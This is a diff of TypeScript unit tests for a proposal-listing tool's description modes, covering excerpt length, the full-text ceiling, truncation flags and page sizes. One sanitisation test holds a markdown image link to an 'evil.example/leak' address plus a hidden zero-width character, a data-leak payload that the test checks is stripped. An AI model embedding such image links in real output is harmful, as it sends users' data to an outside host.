@@ -517,6 +517,7 @@ describe('hypha_list_proposals', () => {
         title: 'Fund the garden',
         label: 'Quest',
         creatorName: 'Ada Lovelace',
+        description: null,
         truncated: [],
       },
     });
@@ -687,6 +688,168 @@ describe('hypha_list_proposals', () => {
     });
     expect(r.isError).toBe(true);
     expect(r.content[0]!.text).toMatch(/cursor/i);
+  });
+
+  describe('description modes', () => {
+    const long = (n: number) => 'word '.repeat(Math.ceil(n / 5)).slice(0, n);
+    const withText = (text: string | null) =>
+      listing([item({ description: text })]);
+    const userTextOf = (r: ToolResponse) =>
+      (
+        r.structuredContent as unknown as {
+          items: {
+            userText: {
+              description?: string | null;
+              truncated: string[];
+            };
+          }[];
+        }
+      ).items[0]!.userText;
+
+    it('defaults to an excerpt of about 500 characters, flagged when cut', async () => {
+      const { deps } = makeDeps({}, withText(long(2000)));
+      const t = userTextOf(
+        await call(deps, 'hypha_list_proposals', { spaceSlug: 'alpha' }),
+      );
+      expect(Array.from(t.description!).length).toBeLessThanOrEqual(500);
+      expect(Array.from(t.description!).length).toBeGreaterThan(400);
+      expect(t.truncated).toContain('description');
+    });
+
+    it('a short description is returned whole and not flagged, in the default and in excerpt', async () => {
+      const { deps } = makeDeps({}, withText('Plant the garden.'));
+      for (const args of [{}, { description: 'excerpt' }]) {
+        const t = userTextOf(
+          await call(deps, 'hypha_list_proposals', {
+            spaceSlug: 'alpha',
+            ...args,
+          }),
+        );
+        expect(t.description).toBe('Plant the garden.');
+        expect(t.truncated).not.toContain('description');
+      }
+    });
+
+    it('none: the description is absent', async () => {
+      const { deps } = makeDeps({}, withText(long(2000)));
+      const t = userTextOf(
+        await call(deps, 'hypha_list_proposals', {
+          spaceSlug: 'alpha',
+          description: 'none',
+        }),
+      );
+      expect(t).not.toHaveProperty('description');
+      expect(t.truncated).not.toContain('description');
+    });
+
+    it('full: the whole text up to the 10,000 character ceiling, flagged when the ceiling is hit', async () => {
+      const { deps: under } = makeDeps({}, withText(long(9000)));
+      const a = userTextOf(
+        await call(under, 'hypha_list_proposals', {
+          spaceSlug: 'alpha',
+          description: 'full',
+        }),
+      );
+      expect(Array.from(a.description!).length).toBeGreaterThan(8900);
+      expect(a.truncated).not.toContain('description');
+
+      const { deps: over } = makeDeps({}, withText(long(25000)));
+      const b = userTextOf(
+        await call(over, 'hypha_list_proposals', {
+          spaceSlug: 'alpha',
+          description: 'full',
+        }),
+      );
+      expect(Array.from(b.description!).length).toBeLessThanOrEqual(10_000);
+      expect(Array.from(b.description!).length).toBeGreaterThan(9_900);
+      expect(b.truncated).toContain('description');
+    });
+
+    it('a missing description is null, never an empty guess', async () => {
+      const { deps } = makeDeps({}, withText(null));
+      const t = userTextOf(
+        await call(deps, 'hypha_list_proposals', { spaceSlug: 'alpha' }),
+      );
+      expect(t.description).toBeNull();
+    });
+
+    it('the description is sanitised like every user text (links, images, hidden characters)', async () => {
+      const { deps } = makeDeps(
+        {},
+        withText(
+          `Read ![x](https://evil.example/leak?d=1) and [here](https://evil.example/a)${ZERO_WIDTH} now`,
+        ),
+      );
+      const t = userTextOf(
+        await call(deps, 'hypha_list_proposals', {
+          spaceSlug: 'alpha',
+          description: 'full',
+        }),
+      );
+      expect(t.description).not.toMatch(/evil\.example/);
+      expect(t.description).not.toContain(ZERO_WIDTH);
+    });
+
+    it('page limit: 50 in none and excerpt, 10 in full (also when more is asked)', async () => {
+      const listProposals = vi.fn(async () => ({
+        ok: true as const,
+        data: { items: [], total: 100, asOf: 'x', asOfBlock: null },
+      }));
+      const { deps } = makeDeps({}, { listProposals } as never);
+      const limitOf = async (args: Record<string, unknown>) => {
+        await call(deps, 'hypha_list_proposals', {
+          spaceSlug: 'alpha',
+          ...args,
+        });
+        const calls = listProposals.mock.calls as unknown as [
+          { paging: { limit: number } },
+        ][];
+        return calls.at(-1)![0].paging.limit;
+      };
+      expect(await limitOf({})).toBe(20);
+      expect(await limitOf({ pageSize: 50 })).toBe(50);
+      expect(await limitOf({ description: 'none', pageSize: 50 })).toBe(50);
+      expect(await limitOf({ description: 'full' })).toBe(10);
+      expect(await limitOf({ description: 'full', pageSize: 50 })).toBe(10);
+      expect(await limitOf({ description: 'full', pageSize: 5 })).toBe(5);
+    });
+
+    it('in full mode the cursor advances by the effective page size', async () => {
+      const listProposals = vi.fn(async () => ({
+        ok: true as const,
+        data: { items: [item()], total: 45, asOf: 'x', asOfBlock: null },
+      }));
+      const { deps } = makeDeps({}, { listProposals } as never);
+      const r = await call(deps, 'hypha_list_proposals', {
+        spaceSlug: 'alpha',
+        description: 'full',
+        pageSize: 50,
+      });
+      expect(decodeCursor(r.structuredContent?.nextCursor as string)).toBe(10);
+    });
+
+    it('keeps the avatar URL out and kind as the stored state', async () => {
+      const { deps } = makeDeps(
+        {},
+        listing([
+          item({
+            kind: 'agreement',
+            creator: {
+              name: 'Ada',
+              surname: 'L',
+              avatarUrl: 'https://img.example/a.png',
+            },
+            description: 'text',
+          }),
+        ]),
+      );
+      const r = await call(deps, 'hypha_list_proposals', {
+        spaceSlug: 'alpha',
+        description: 'full',
+      });
+      expect(JSON.stringify(r)).not.toContain('img.example');
+      expect(first(r).kind).toBe('agreement');
+    });
   });
 
   it('unknown, not visible and forbidden give the same answer', async () => {
